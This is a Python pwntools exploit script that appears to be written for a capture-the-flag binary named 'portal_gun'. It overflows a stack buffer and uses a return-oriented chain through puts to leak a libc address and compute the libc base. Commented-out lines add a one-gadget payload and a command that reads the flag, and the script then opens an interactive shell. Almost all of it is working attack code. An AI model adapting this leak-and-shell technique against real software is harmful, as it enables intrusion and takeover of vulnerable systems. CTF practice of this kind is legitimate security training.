from pwn import *
import time
context.log_level = 'DEBUG'
context.arch = "amd64"
libc = ELF("libc.so.6")
# ip = "localhost"
# port = 10002
r = process('./portal_gun')

main = 0x4006fb
puts_plt = 0x400560
puts_got = 0x601018
pop_rdi = 0x4007a3

payload = 'a' * 120 + flat(pop_rdi, puts_got, puts_plt)

r.sendlineafter("?", payload)
r.recvline()
libc_base = u64(r.recvline()[:6].ljust(8, '\x00')) - libc.sym.puts

info("libc base: {}".format(hex(libc_base)))

# magic = libc_base + 0x10a38c
# payload = 'a' * 120 + flat(magic)
# r.sendlineafter("?", payload)

# time.sleep(0.5)
# r.sendline("cat /home/`whoami`/flag")

r.interactive()
